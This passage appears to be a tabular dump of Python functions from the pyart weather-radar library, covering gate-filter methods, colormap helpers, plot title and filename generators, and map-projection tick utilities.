        self._gate_excluded = np.logical_and(self._gate_excluded, marked)
    elif op == 'new':
        self._gate_excluded = marked
    else:
        raise ValueError(""invalid 'op' parameter: "", op)
    return"
ARM-DOE/pyart,exclude_transition,"def exclude_transition(self, trans_value=1, exclude_masked=True, op='or'):
    """"""
        Exclude all gates in rays marked as in transition between sweeps.

        Exclude all gates in rays marked as ""in transition"" by the
        antenna_transition attribute of the radar used to construct the filter.
        If no antenna transition information is available no gates are
        excluded.

        Parameters
        ----------
        trans_value : int, optional
            Value used in the antenna transition data to indicate that the
            instrument was between sweeps (in transition) during the collection
            of a specific ray. Typically a value of 1 is used to indicate this
            transition and the default can be used in these cases.
        exclude_masked : bool, optional
            True to filter masked values in antenna_transition if the data is
            a masked array, False to include any masked values.
        op : {'and', 'or', 'new'}
            Operation to perform when merging the existing set of excluded
            gates with the excluded gates from the current operation.
            'and' will perform a logical AND operation, 'or' a logical OR,
            and 'new' will replace the existing excluded gates with the one
            generated here. 'or', the default for exclude methods, is
            typically desired when building up a set of conditions for
            excluding gates where the desired effect is to exclude gates which
            meet any of the conditions. 'and', the default for include
            methods, is typically desired when building up a set of conditions
            where the desired effect is to include gates which meet any of the
            conditions.  Note that the 'and' method MAY results in including
            gates which have previously been excluded because they were masked
            or invalid.

        """"""
    marked = np.zeros_like(self._gate_excluded)
    if self._radar.antenna_transition is not None:
        transition_data = self._radar.antenna_transition['data']
        in_transition = transition_data == trans_value
        marked[in_transition] = True
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,exclude_below,"def exclude_below(self, field, value, exclude_masked=True, op='or', inclusive=False):
    """"""
        Exclude gates where a given field is below a given value.

        Parameters
        ----------
        field : str
            Name of field compared against the value.
        value : float
            Gates with a value below this value in the specified field will
            be marked for exclusion in the filter.
        exclude_masked : bool, optional
            True to filter masked values in the specified field if the data is
            a masked array, False to include any masked values.
        op : {'and', 'or', 'new'}
            Operation to perform when merging the existing set of excluded
            gates with the excluded gates from the current operation.
            'and' will perform a logical AND operation, 'or' a logical OR,
            and 'new' will replace the existing excluded gates with the one
            generated here. 'or', the default for exclude methods, is
            typically desired when building up a set of conditions for
            excluding gates where the desired effect is to exclude gates which
            meet any of the conditions. 'and', the default for include
            methods, is typically desired when building up a set of conditions
            where the desired effect is to include gates which meet any of the
            conditions.  Note that the 'and' method MAY results in including
            gates which have previously been excluded because they were masked
            or invalid.
        inclusive : bool
            Indicates whether the specified value should also be excluded.

        """"""
    if inclusive:
        marked = self._get_fdata(field) <= value
    else:
        marked = self._get_fdata(field) < value
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,exclude_above,"def exclude_above(self, field, value, exclude_masked=True, op='or', inclusive=False):
    """"""Exclude gates where a given field is above a given value.""""""
    if inclusive:
        marked = self._get_fdata(field) >= value
    else:
        marked = self._get_fdata(field) > value
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,exclude_inside,"def exclude_inside(self, field, v1, v2, exclude_masked=True, op='or', inclusive=True):
    """"""Exclude gates where a given field is inside a given interval.""""""
    if v2 < v1:
        (v1, v2) = (v2, v1)
    fdata = self._get_fdata(field)
    if inclusive:
        marked = (fdata >= v1) & (fdata <= v2)
    else:
        marked = (fdata > v1) & (fdata < v2)
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,exclude_outside,"def exclude_outside(self, field, v1, v2, exclude_masked=True, op='or', inclusive=False):
    """"""Exclude gates where a given field is outside a given interval.""""""
    if v2 < v1:
        (v1, v2) = (v2, v1)
    fdata = self._get_fdata(field)
    if inclusive:
        marked = (fdata <= v1) | (fdata >= v2)
    else:
        marked = (fdata < v1) | (fdata > v2)
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,exclude_equal,"def exclude_equal(self, field, value, exclude_masked=True, op='or'):
    """"""Exclude gates where a given field is equal to a value.""""""
    marked = self._get_fdata(field) == value
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,exclude_not_equal,"def exclude_not_equal(self, field, value, exclude_masked=True, op='or'):
    """"""Exclude gates where a given field is not equal to a value.""""""
    marked = self._get_fdata(field) != value
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,exclude_all,"def exclude_all(self):
    """"""Exclude all gates.""""""
    self._gate_excluded = np.ones_like(self._gate_excluded)
    return"
ARM-DOE/pyart,exclude_none,"def exclude_none(self):
    """"""Exclude no gates, include all gates.""""""
    self._gate_excluded = np.zeros_like(self._gate_excluded)
    return"
ARM-DOE/pyart,exclude_masked,"def exclude_masked(self, field, exclude_masked=True, op='or'):
    """"""Exclude gates where a given field is masked.""""""
    marked = np.ma.getmaskarray(self._get_fdata(field))
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,exclude_invalid,"def exclude_invalid(self, field, exclude_masked=True, op='or'):
    """"""
        Exclude gates where an invalid value occurs in a field (NaNs or infs).
        """"""
    marked = ~np.isfinite(self._get_fdata(field))
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,exclude_gates,"def exclude_gates(self, mask, exclude_masked=True, op='or'):
    """"""
        Exclude gates where a given mask is equal True.

        Parameters
        ----------
        mask : numpy array
            Boolean numpy array with same shape as a field array.
        exclude_masked : bool, optional
            True to filter masked values in the specified mask if it is
            a masked array, False to include any masked values.
        op : {'and', 'or', 'new'}
            Operation to perform when merging the existing set of excluded
            gates with the excluded gates from the current operation.
            'and' will perform a logical AND operation, 'or' a logical OR,
            and 'new' will replace the existing excluded gates with the one
            generated here. 'or', the default for exclude methods, is
            typically desired when building up a set of conditions for
            excluding gates where the desired effect is to exclude gates which
            meet any of the conditions. 'and', the default for include
            methods, is typically desired when building up a set of conditions
            where the desired effect is to include gates which meet any of the
            conditions. Note that the 'and' method MAY results in including
            gates which have previously been excluded because they were masked
            or invalid.

        """"""
    fdata = next(iter(self._radar.fields.values()))['data']
    if mask.shape != fdata.shape:
        raise ValueError('mask array must be the same size as a field.')
    marked = np.array(mask, dtype='bool')
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,include_not_transition,"def include_not_transition(self, trans_value=0, exclude_masked=True, op='and'):
    """"""
        Include all gates in rays not marked as in transition between sweeps.

        Include all gates in rays not marked as ""in transition"" by the
        antenna_transition attribute of the radar used to construct the filter.
        If no antenna transition information is available all gates are
        included.

        Parameters
        ----------
        trans_value : int, optional
            Value used in the antenna transition data to indicate that the
            instrument is not between sweeps (in transition) during the
            collection of a specific ray. Typically a value of 0 is used to
            indicate no transition and the default can be used in these cases.
        exclude_masked : bool, optional
            True to filter masked values in antenna_transition if the data is
            a masked array, False to include any masked values.
        op : {'and', 'or', 'new'}
            Operation to perform when merging the existing set of excluded
            gates with the excluded gates from the current operation.
            'and' will perform a logical AND operation, 'or' a logical OR,
            and 'new' will replace the existing excluded gates with the one
            generated here. 'or', the default for exclude methods, is
            typically desired when building up a set of conditions for
            excluding gates where the desired effect is to exclude gates which
            meet any of the conditions. 'and', the default for include
            methods, is typically desired when building up a set of conditions
            where the desired effect is to include gates which meet any of the
            conditions. Note that the 'or' method MAY results in excluding
            gates which have previously been included.

        """"""
    if self._radar.antenna_transition is None:
        include = np.ones_like(self._gate_excluded)
    else:
        include = np.zeros_like(self._gate_excluded)
        transition_data = self._radar.antenna_transition['data']
        not_in_transition = transition_data == trans_value
        include[not_in_transition] = True
    return self._merge(~include, op, exclude_masked)"
ARM-DOE/pyart,include_below,"def include_below(self, field, value, exclude_masked=True, op='and', inclusive=False):
    """"""Include gates where a given field is below a given value.""""""
    if inclusive:
        marked = self._get_fdata(field) <= value
    else:
        marked = self._get_fdata(field) < value
    self._merge(~marked, op, exclude_masked)"
ARM-DOE/pyart,include_above,"def include_above(self, field, value, exclude_masked=True, op='and', inclusive=False):
    """"""Include gates where a given field is above a given value.""""""
    if inclusive:
        marked = self._get_fdata(field) >= value
    else:
        marked = self._get_fdata(field) > value
    self._merge(~marked, op, exclude_masked)"
ARM-DOE/pyart,include_inside,"def include_inside(self, field, v1, v2, exclude_masked=True, op='and', inclusive=True):
    """"""Include gates where a given field is inside a given interval.""""""
    if v2 < v1:
        (v1, v2) = (v2, v1)
    fdata = self._get_fdata(field)
    if inclusive:
        marked = (fdata >= v1) & (fdata <= v2)
    else:
        marked = (fdata > v1) & (fdata < v2)
    return self._merge(~marked, op, exclude_masked)"
ARM-DOE/pyart,include_outside,"def include_outside(self, field, v1, v2, exclude_masked=True, op='and', inclusive=False):
    """"""Include gates where a given field is outside a given interval.""""""
    if v2 < v1:
        (v1, v2) = (v2, v1)
    fdata = self._get_fdata(field)
    if inclusive:
        marked = (fdata <= v1) | (fdata >= v2)
    else:
        marked = (fdata < v1) | (fdata > v2)
    return self._merge(~marked, op, exclude_masked)"
ARM-DOE/pyart,include_equal,"def include_equal(self, field, value, exclude_masked=True, op='and'):
    """"""Include gates where a given field is equal to a value.""""""
    marked = self._get_fdata(field) == value
    return self._merge(~marked, op, exclude_masked)"
ARM-DOE/pyart,include_not_equal,"def include_not_equal(self, field, value, exclude_masked=True, op='and'):
    """"""Include gates where a given field is not equal to a value.""""""
    marked = self._get_fdata(field) != value
    return self._merge(~marked, op, exclude_masked)"
ARM-DOE/pyart,include_all,"def include_all(self):
    """"""Include all gates.""""""
    self._gate_excluded = np.zeros_like(self._gate_excluded)"
ARM-DOE/pyart,include_none,"def include_none(self):
    """"""Include no gates, exclude all gates.""""""
    self._gate_excluded = np.ones_like(self._gate_excluded)"
ARM-DOE/pyart,include_not_masked,"def include_not_masked(self, field, exclude_masked=True, op='and'):
    """"""Include gates where a given field in not masked.""""""
    marked = np.ma.getmaskarray(self._get_fdata(field))
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,include_valid,"def include_valid(self, field, exclude_masked=True, op='and'):
    """"""
        Include gates where a valid value occurs in a field (not NaN or inf).
        """"""
    marked = np.isfinite(self._get_fdata(field))
    return self._merge(~marked, op, exclude_masked)"
ARM-DOE/pyart,include_gates,"def include_gates(self, mask, exclude_masked=True, op='and'):
    """"""
        Include gates where a given mask is equal True.

        Parameters
        ----------
        mask : numpy array
            Boolean numpy array with same shape as a field array.
        exclude_masked : bool, optional
            True to filter masked values in the specified mask if it is
            a masked array, False to include any masked values.
        op : {'and', 'or', 'new'}
            Operation to perform when merging the existing set of excluded
            gates with the excluded gates from the current operation.
            'and' will perform a logical AND operation, 'or' a logical OR,
            and 'new' will replace the existing excluded gates with the one
            generated here. 'or', the default for exclude methods, is
            typically desired when building up a set of conditions for
            excluding gates where the desired effect is to exclude gates which
            meet any of the conditions. 'and', the default for include
            methods, is typically desired when building up a set of conditions
            where the desired effect is to include gates which meet any of the
            conditions. Note that the 'or' method MAY results in excluding
            gates which have previously been included.

        """"""
    fdata = next(iter(self._radar.fields.values()))['data']
    if mask.shape != fdata.shape:
        raise ValueError('Mask array must be the same size as a field.')
    marked = ~np.array(mask, dtype='bool')
    return self._merge(marked, op, exclude_masked)"
ARM-DOE/pyart,yuv_rainbow_24,"def yuv_rainbow_24(nc):
    path1 = np.linspace(0.8 * np.pi, 1.8 * np.pi, nc)
    path2 = np.linspace(-0.33 * np.pi, 0.33 * np.pi, nc)
    y = np.concatenate([np.linspace(0.3, 0.85, nc * 2 // 5), np.linspace(0.9, 0.0, nc - nc * 2 // 5)])
    u = 0.4 * np.sin(path1)
    v = 0.55 * np.sin(path2) + 0.1
    rgb_from_yuv = np.array([[1, 0, 1.13983], [1, -0.39465, -0.5806], [1, 2.03211, 0]])
    cmap_dict = {'blue': [], 'green': [], 'red': []}
    for i in range(len(y)):
        yuv = np.array([y[i], u[i], v[i]])
        rgb = rgb_from_yuv.dot(yuv)
        red_tuple = (i / (len(y) - 1.0), rgb[0], rgb[0])
        green_tuple = (i / (len(y) - 1.0), rgb[1], rgb[1])
        blue_tuple = (i / (len(y) - 1.0), rgb[2], rgb[2])
        cmap_dict['blue'].append(blue_tuple)
        cmap_dict['red'].append(red_tuple)
        cmap_dict['green'].append(green_tuple)
    return cmap_dict"
ARM-DOE/pyart,_reverser,"def _reverser(f):
    """"""perform reversal.""""""

    def freversed(x):
        """"""f specific reverser.""""""
        return f(1 - x)
    return freversed"
ARM-DOE/pyart,revcmap,"def revcmap(data):
    """"""Can only handle specification *data* in dictionary format.""""""
    data_r = {}
    for (key, val) in data.items():
        if callable(val):
            valnew = _reverser(val)
        else:
            valnew = [(1.0 - x, y1, y0) for (x, y0, y1) in reversed(val)]
        data_r[key] = valnew
    return data_r"
ARM-DOE/pyart,_reverse_cmap_spec,"def _reverse_cmap_spec(spec):
    """"""Reverses cmap specification *spec*, can handle both dict and tuple
    type specs.""""""
    with warnings.catch_warnings():
        warnings.simplefilter('ignore', FutureWarning)
        if isinstance(spec, dict) and 'red' in spec.keys():
            return revcmap(spec)
        else:
            revspec = list(reversed(spec))
            if len(revspec[0]) == 2:
                revspec = [(1.0 - a, b) for (a, b) in revspec]
            return revspec"
ARM-DOE/pyart,_generate_cmap,"def _generate_cmap(name, lutsize):
    """"""Generates the requested cmap from it's name *name*.  The lut size is
    *lutsize*.""""""
    spec = datad[name]
    if isinstance(spec, dict) and 'red' in spec.keys():
        return colors.LinearSegmentedColormap(name, spec, lutsize)
    else:
        return colors.LinearSegmentedColormap.from_list(name, spec, lutsize)"
ARM-DOE/pyart,freversed,"def freversed(x):
    """"""f specific reverser.""""""
    return f(1 - x)"
ARM-DOE/pyart,_generate_cmap,"def _generate_cmap(name, lutsize):
    """"""Generates the requested cmap from it's name *name*. The lut size is
    *lutsize*.""""""
    spec = datad[name]
    with warnings.catch_warnings():
        warnings.simplefilter('ignore', FutureWarning)
        if isinstance(spec, dict) and 'red' in spec.keys():
            return colors.LinearSegmentedColormap(name, spec, lutsize)
        else:
            return colors.LinearSegmentedColormap.from_list(name, spec, lutsize)"
ARM-DOE/pyart,parse_ax,"def parse_ax(ax):
    """"""Parse and return ax parameter.""""""
    if ax is None:
        ax = plt.gca()
    return ax"
ARM-DOE/pyart,parse_ax_fig,"def parse_ax_fig(ax, fig):
    """"""Parse and return ax and fig parameters.""""""
    if ax is None:
        ax = plt.gca()
    if fig is None:
        fig = plt.gcf()
    return (ax, fig)"
ARM-DOE/pyart,parse_cmap,"def parse_cmap(cmap, field=None):
    """"""Parse and return the cmap parameter.""""""
    if cmap is None:
        cmap = get_field_colormap(field)
    return cmap"
ARM-DOE/pyart,parse_vmin_vmax,"def parse_vmin_vmax(container, field, vmin, vmax):
    """"""Parse and return vmin and vmax parameters.""""""
    field_dict = container.fields[field]
    (field_default_vmin, field_default_vmax) = get_field_limits(field)
    if vmin is None:
        if 'valid_min' in field_dict:
            vmin = field_dict['valid_min']
        else:
            vmin = field_default_vmin
    if vmax is None:
        if 'valid_max' in field_dict:
            vmax = field_dict['valid_max']
        else:
            vmax = field_default_vmax
    return (vmin, vmax)"
ARM-DOE/pyart,parse_lon_lat,"def parse_lon_lat(grid, lon, lat):
    """"""Parse lat and lon parameters""""""
    if lat is None:
        lat = grid.origin_latitude['data'][0]
    if lon is None:
        lon = grid.origin_longitude['data'][0]
    return (lon, lat)"
ARM-DOE/pyart,generate_colorbar_label,"def generate_colorbar_label(standard_name, units):
    """"""Generate and return a label for a colorbar.""""""
    return str(standard_name).replace('_', ' ') + ' (' + units + ')'"
ARM-DOE/pyart,generate_field_name,"def generate_field_name(container, field):
    """"""Return a nice field name for a particular field.""""""
    if 'standard_name' in container.fields[field]:
        field_name = container.fields[field]['standard_name']
    elif 'long_name' in container.fields[field]:
        field_name = container.fields[field]['long_name']
    else:
        field_name = str(field)
    field_name = field_name.replace('_', ' ')
    field_name = field_name[0].upper() + field_name[1:]
    return field_name"
ARM-DOE/pyart,generate_radar_name,"def generate_radar_name(radar):
    """"""Return radar name.""""""
    if 'instrument_name' in radar.metadata:
        return radar.metadata['instrument_name']
    else:
        return ''"
ARM-DOE/pyart,generate_grid_name,"def generate_grid_name(grid):
    """"""Return grid name.""""""
    if 'instrument_name' in grid.metadata:
        return grid.metadata['instrument_name']
    else:
        return ''"
ARM-DOE/pyart,generate_radar_time_begin,"def generate_radar_time_begin(radar):
    """"""Return time begin in datetime instance.""""""
    times = int(radar.time['data'][0])
    units = radar.time['units']
    calendar = radar.time['calendar']
    return num2date(times, units, calendar, only_use_cftime_datetimes=False, only_use_python_datetimes=True)"
ARM-DOE/pyart,generate_radar_time_sweep,"def generate_radar_time_sweep(radar, sweep):
    """"""Return time that a specific sweep began in a datetime instance.""""""
    first_ray = radar.sweep_start_ray_index['data'][sweep]
    times = int(radar.time['data'][first_ray])
    units = radar.time['units']
    calendar = radar.time['calendar']
    return num2date(times, units, calendar, only_use_cftime_datetimes=False, only_use_python_datetimes=True)"
ARM-DOE/pyart,generate_grid_time_begin,"def generate_grid_time_begin(grid):
    """"""Return time begin in datetime instance.""""""
    times = int(grid.time['data'][0])
    units = grid.time['units']
    if 'calendar' in grid.time:
        calendar = grid.time['calendar']
    else:
        calendar = 'standard'
    return num2date(times, units, calendar, only_use_cftime_datetimes=False, only_use_python_datetimes=True)"
ARM-DOE/pyart,generate_filename,"def generate_filename(radar, field, sweep, ext='png', datetime_format='%Y%m%d%H%M%S', use_sweep_time=False):
    """"""
    Generate a filename for a plot.

    Generated filename has form:
        radar_name_field_sweep_time.ext

    Parameters
    ----------
    radar : Radar
        Radar structure.
    field : str
        Field plotted.
    sweep : int
        Sweep plotted.
    ext : str
        Filename extension.
    datetime_format : str
        Format of datetime (using strftime format).
    use_sweep_time : bool
        If true, the current sweep's beginning time is used.

    Returns
    -------
    filename : str
        Filename suitable for saving a plot.

    """"""
    name_s = generate_radar_name(radar).replace(' ', '_')
    field_s = field.replace(' ', '_')
    if use_sweep_time:
        time_s = generate_radar_time_sweep(radar, sweep).strftime(datetime_format)
    else:
        time_s = generate_radar_time_begin(radar).strftime(datetime_format)
    sweep_s = str(sweep).zfill(2)
    return f'{name_s}_{field_s}_{sweep_s}_{time_s}.{ext}'"
ARM-DOE/pyart,generate_grid_filename,"def generate_grid_filename(grid, field, level, ext='png'):
    """"""
    Generate a filename for a plot.

    Generated filename has form:
        grid_name_field_level_time.ext

    Parameters
    ----------
    grid : Grid
        Grid structure.
    field : str
        Field plotted.
    level : int
        Level plotted.
    ext : str
        Filename extension.

    Returns
    -------
    filename : str
        Filename suitable for saving a plot.

    """"""
    name_s = generate_grid_name(grid).replace(' ', '_')
    field_s = field.replace(' ', '_')
    time_s = generate_grid_time_begin(grid).strftime('%Y%m%d%H%M%S')
    level_s = str(level).zfill(2)
    return f'{name_s}_{field_s}_{level_s}_{time_s}.{ext}'"
ARM-DOE/pyart,generate_cross_section_title,"def generate_cross_section_title(grid, field, start, end):
    """"""
    Generate a title for a plot.

    Parameters
    ----------
    grid : Grid
        Radar structure.
    field : str
        Field plotted.
    start : tuple
        Latitude-Longitude pair of starting points
    end: tuple
        Latitude-Longitude pair of ending poins

    Returns
    -------
    title : str
        Plot title.

    """"""
    time_str = generate_grid_time_begin(grid).strftime('%Y-%m-%dT%H:%M:%SZ')
    field_name = generate_field_name(grid, field)
    (start_lat, start_lon) = start
    (end_lat, end_lon) = end
    degree_symbol = '°'
    if start_lat < 0:
        start_lat_string = f'{-start_lat}{degree_symbol}S'
    else:
        start_lat_string = f'{start_lat}{degree_symbol}N'
    if end_lat < 0:
        end_lat_string = f'{-end_lat}{degree_symbol}S'
    else:
        end_lat_string = f'{end_lat}{degree_symbol}N'
    if start_lon < 0:
        start_lon_string = f'{-start_lon}{degree_symbol}W'
    else:
        start_lon_string = f'{start_lon}{degree_symbol}E'
    if end_lon < 0:
        end_lon_string = f'{-end_lon}{degree_symbol}W'
    else:
        end_lon_string = f'{end_lon}{degree_symbol}E'
    return f'({start_lat_string}, {start_lon_string}) to ({end_lat_string}, {end_lon_string}) \n {time_str} \n {field_name}'"
ARM-DOE/pyart,generate_title,"def generate_title(radar, field, sweep, datetime_format=None, use_sweep_time=True):
    """"""
    Generate a title for a plot.

    Parameters
    ----------
    radar : Radar
        Radar structure.
    field : str
        Field plotted.
    sweep : int
        Sweep plotted.
    datetime_format : str
        Format of datetime (using strftime format).
    use_sweep_time : bool
        If true, the current sweep's beginning time is used.

    Returns
    -------
    title : str
        Plot title.

    """"""
    if use_sweep_time:
        begin_time = generate_radar_time_sweep(radar, sweep)
    else:
        begin_time = generate_radar_time_begin(radar)
    if datetime_format:
        time_str = begin_time.strftime(datetime_format)
    else:
        time_str = begin_time.isoformat() + 'Z'
    fixed_angle = radar.fixed_angle['data'][sweep]
    l1 = f'{generate_radar_name(radar)} {fixed_angle:.1f} Deg. {time_str} '
    field_name = generate_field_name(radar, field)
    return l1 + '\n' + field_name"
ARM-DOE/pyart,generate_grid_title,"def generate_grid_title(grid, field, level):
    """"""
    Generate a title for a plot.

    Parameters
    ----------
    grid : Grid
        Radar structure.
    field : str
        Field plotted.
    level : int
        Verical level plotted.


    Returns
    -------
    title : str
        Plot title.

    """"""
    time_str = generate_grid_time_begin(grid).isoformat() + 'Z'
    height = grid.z['data'][level] / 1000.0
    l1 = f'{generate_grid_name(grid)} {height:.1f} km {time_str} '
    field_name = generate_field_name(grid, field)
    return l1 + '\n' + field_name"
ARM-DOE/pyart,generate_longitudinal_level_title,"def generate_longitudinal_level_title(grid, field, level):
    """"""
    Generate a title for a plot.

    Parameters
    ----------
    grid : Grid
        Radar structure.
    field : str
        Field plotted.
    level : int
        Longitudinal level plotted.


    Returns
    -------
    title : str
        Plot title.

    """"""
    time_str = generate_grid_time_begin(grid).strftime('%Y-%m-%dT%H:%M:%SZ')
    disp = grid.x['data'][level] / 1000.0
    if disp >= 0:
        direction = 'east'
    else:
        direction = 'west'
        disp = -disp
    l1 = f'{generate_grid_name(grid)} {disp:.1f} km {direction} of origin {time_str} '
    field_name = generate_field_name(grid, field)
    return l1 + '\n' + field_name"
ARM-DOE/pyart,generate_latitudinal_level_title,"def generate_latitudinal_level_title(grid, field, level):
    """"""
    Generate a title for a plot.

    Parameters
    ----------
    grid : Grid
        Radar structure.
    field : str
        Field plotted.
    level : int
        Latitudinal level plotted.


    Returns
    -------
    title : str
        Plot title.

    """"""
    time_str = generate_grid_time_begin(grid).isoformat() + 'Z'
    disp = grid.y['data'][level] / 1000.0
    if disp >= 0:
        direction = 'north'
    else:
        direction = 'south'
        disp = -disp
    l1 = f'{generate_grid_name(grid)} {disp:.1f} km {direction} of origin {time_str} '
    field_name = generate_field_name(grid, field)
    return l1 + '\n' + field_name"
ARM-DOE/pyart,generate_vpt_title,"def generate_vpt_title(radar, field):
    """"""
    Generate a title for a VPT plot.

    Parameters
    ----------
    radar : Radar
        Radar structure.
    field : str
        Field plotted.

    Returns
    -------
    title : str
        Plot title.

    """"""
    time_str = generate_radar_time_begin(radar).isoformat() + 'Z'
    l1 = f'{generate_radar_name(radar)} {time_str} '
    field_name = generate_field_name(radar, field)
    return l1 + '\n' + field_name"
ARM-DOE/pyart,generate_ray_title,"def generate_ray_title(radar, field, ray):
    """"""
    Generate a title for a ray plot.

    Parameters
    ----------
    radar : Radar
        Radar structure.
    field : str
        Field plotted.
    ray : int
        Ray plotted.

    Returns
    -------
    title : str
        Plot title.

    """"""
    time_str = generate_radar_time_begin(radar).isoformat() + 'Z'
    l1 = f'{generate_radar_name(radar)} {time_str}'
    azim = radar.azimuth['data'][ray]
    elev = radar.elevation['data'][ray]
    l2 = 'Ray: %i  Elevation: %.1f Azimuth: %.1f' % (ray, elev, azim)
    field_name = generate_field_name(radar, field)
    return l1 + '\n' + l2 + '\n' + field_name"
ARM-DOE/pyart,generate_az_rhi_title,"def generate_az_rhi_title(radar, field, azimuth):
    """"""
    Generate a title for a pseudo-RHI from PPI azimuth plot.

    Parameters
    ----------
    radar : Radar
        Radar structure.
    field : str
        Field plotted.
    azimuth : float
        Azimuth plotted.

    Returns
    -------
    title : str
        Plot title.

    """"""
    time_str = generate_radar_time_begin(radar).isoformat() + 'Z'
    l1 = f'{generate_radar_name(radar)} {time_str} '
    l2 = 'Azimuth: %.1f deg' % azimuth
    field_name = generate_field_name(radar, field)
    return l1 + '\n' + l2 + '\n' + field_name"
ARM-DOE/pyart,set_limits,"def set_limits(xlim=None, ylim=None, ax=None):
    """"""
    Set the display limits.

    Parameters
    ----------
    xlim : tuple, optional
        2-Tuple containing y-axis limits in km. None uses default limits.
    ylim : tuple, optional
        2-Tuple containing x-axis limits in km. None uses default limits.
    ax : Axis
        Axis to adjust.  None will adjust the current axis.

    """"""
    if ax is None:
        ax = plt.gca()
    if ylim is not None:
        ax.set_ylim(ylim)
    if xlim is not None:
        ax.set_xlim(xlim)"
ARM-DOE/pyart,plot_convstrat_scheme,"def plot_convstrat_scheme(always_core_thres, use_cosine, max_diff=None, zero_diff_cos_val=None, use_addition=False, scalar_diff=None):
    """"""
    Plots the scheme used in the convective stratiform classification

    Parameters
    ----------
    always_core_thres : float
        All values above this threshold considered to be convective
    use_cosine : bool
        Boolean used to determine if cosine scheme should be used for identifying convective cores (True) or a scalar
        scheme (False)
    max_diff : float, optional
        Maximum difference between background average and reflectivity in order to be classified as convective.
        ""a"" value in Eqn. B1 in Yuter and Houze (1997)
    zero_diff_cos_val : float, optional
        Value where difference between background average and reflectivity is zero in the cosine function
        ""b"" value in Eqn. B1 in Yuter and Houze (1997)
    use_addition : bool, optional
        Determines if a multiplier (False) or addition (True) in the scalar difference scheme should be used
    scalar_diff : float, optional
        If using a scalar difference scheme, this value is the multiplier or addition to the background average

    """"""
    bkg_vals = np.linspace(0, 60, 100)
    if use_cosine:
        diff = max_diff * np.cos(np.pi * bkg_vals / (2 * zero_diff_cos_val))
    elif use_addition:
        diff = bkg_vals + scalar_diff - bkg_vals
    else:
        diff = bkg_vals * scalar_diff - bkg_vals
    diff[diff < 0] = 0
    diff[bkg_vals > always_core_thres] = 0
    ax = plt.gca()
    ax.plot(bkg_vals, diff, lw=2, color='black')
    ax.axvline(x=always_core_thres, lw=1, ls='--', color='red')
    ax.text(always_core_thres + 2, 1, 'Always Core Thres.', color='red')
    if use_cosine:
        ax.axvline(x=zero_diff_cos_val, lw=1, ls='--', color='green')
        ax.text(zero_diff_cos_val + 2, 0.75, 'Zero Diff. Cosine Val.', color='green')
        ax.axhline(y=max_diff, lw=1, ls='--', color='blue')
        ax.text(10, max_diff + 0.05, 'Max. Diff.', color='blue')
    elif use_addition:
        ax.axhline(y=scalar_diff, lw=1, ls='--', color='orange')
        ax.text(10, scalar_diff + 0.05, 'Scalar Diff.', color='orange')
    ax.grid()
    ax.set_ylim([0, np.max(diff) + 0.2])
    ax.set_xlim([np.min(bkg_vals), np.max(bkg_vals)])
    ax.set_ylabel('Difference (dBZ - dBZ$_{background}$)')
    ax.set_xlabel('Background Value (dBZ$_{background}$)')
    ax.set_title('Convective Stratiform Equation')"
ARM-DOE/pyart,find_side,"def find_side(ls, side):
    """"""
    Given a shapely LineString which is assumed to be rectangular, return the
    line corresponding to a given side of the rectangle.
    """"""
    (minx, miny, maxx, maxy) = ls.bounds
    points = {'left': [(minx, miny), (minx, maxy)], 'right': [(maxx, miny), (maxx, maxy)], 'bottom': [(minx, miny), (maxx, miny)], 'top': [(minx, maxy), (maxx, maxy)]}
    return sgeom.LineString(points[side])"
ARM-DOE/pyart,lambert_xticks,"def lambert_xticks(ax, ticks):
    """"""Draw ticks on the bottom x-axis of a Lambert Conformal projection.""""""

    def te(xy):
        return xy[0]

    def lc(t, n, b):
        return np.vstack((np.zeros(n) + t, np.linspace(b[2], b[3], n))).T
    (xticks, xticklabels) = _lambert_ticks(ax, ticks, 'bottom', lc, te)
    ax.xaxis.tick_bottom()
    ax.set_xticks(xticks)
    ax.set_xticklabels([ax.xaxis.get_major_formatter()(xtick) for xtick in xticklabels])"
ARM-DOE/pyart,lambert_yticks,"def lambert_yticks(ax, ticks):
    """"""Draw ticks on the left y-axis of a Lambert Conformal projection.""""""

    def te(xy):
        return xy[1]

    def lc(t, n, b):
        return np.vstack((np.linspace(b[0], b[1], n), np.zeros(n) + t)).T
    (yticks, yticklabels) = _lambert_ticks(ax, ticks, 'left', lc, te)
    ax.yaxis.tick_left()
    ax.set_yticks(yticks)
    ax.set_yticklabels([ax.yaxis.get_major_formatter()(ytick) for ytick in yticklabels])"
ARM-DOE/pyart,_lambert_ticks,"def _lambert_ticks(ax, ticks, tick_location, line_constructor, tick_extractor):
    """"""
    Get the tick locations and labels for a Lambert Conformal projection.
    """"""
    outline_patch = sgeom.LineString(ax.spines['geo'].get_path().vertices.tolist())
    axis = find_side(outline_patch, tick_location)
    n_steps = 30
    extent = ax.get_extent(cartopy.crs.PlateCarree())
    _ticks = []
    for t in ticks:
        xy = line_constructor(t, n_steps, extent)
        proj_xyz = ax.projection.transform_points(cartopy.crs.Geodetic(), xy[:, 0], xy[:, 1])
        xyt = proj_xyz[..., :2]
        ls = sgeom.LineString(xyt.tolist())
        locs = axis.intersection(ls)
        if not locs:
            tick = [None]
        else:
            tick = tick_extractor(locs.xy)
        _ticks.append(tick[0])
    ticklabels = copy(ticks)
    while True:
        try:
            index = _ticks.index(None)
        except ValueError:
            break
        _ticks.pop(index)
        ticklabels = np.delete(ticklabels, index)
    return (_ticks, ticklabels)"
ARM-DOE/pyart,__init__,"def __init__(self, grid, debug=False):
    """"""initalize the object.""""""
    if not _CARTOPY_AVAILABLE:
        raise MissingOptionalDependency('Cartopy is required to use GridMapDisplay but is not installed!')
    if not _XARRAY_AVAILABLE:
        raise MissingOptionalDependency('Xarray is required to use GridMapDisplay but is not installed!')
    if not _NETCDF4_AVAILABLE:
        raise MissingOptionalDependency('netCDF4 is required to use GridMapDisplay but is not installed!')
    self.grid = grid
    self.debug = debug
    self.mappables = []
    self.fields = []
    self.origin = 'origin'"
